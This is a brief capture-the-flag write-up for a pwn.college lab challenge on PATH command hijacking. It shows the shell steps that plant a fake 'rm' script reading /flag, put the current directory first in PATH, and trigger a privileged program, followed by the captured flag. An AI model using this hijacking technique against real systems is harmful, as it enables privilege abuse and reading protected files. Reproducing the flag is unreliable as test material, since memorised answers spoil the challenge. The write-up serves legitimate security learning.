# Challenge Name
hijacking commands

## My solve
**Flag:** `pwn.college{U5EB2aEVnfD7GpXkkcys6ZtAArV.QX3cjM1wyM3EzNzEzW}`

```bash
Connected!
hacker@path~hijacking-commands:~$ echo 'cat /flag' > rm
hacker@path~hijacking-commands:~$ chmod +x rm
hacker@path~hijacking-commands:~$ PATH=.:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{U5EB2aEVnfD7GpXkkcys6ZtAArV.QX3cjM1wyM3EzNzEzW}
```

## Incorrect tangents I went on
none

## What I learned
this challenge tested more of my knowledge on PATH.

## References 
None
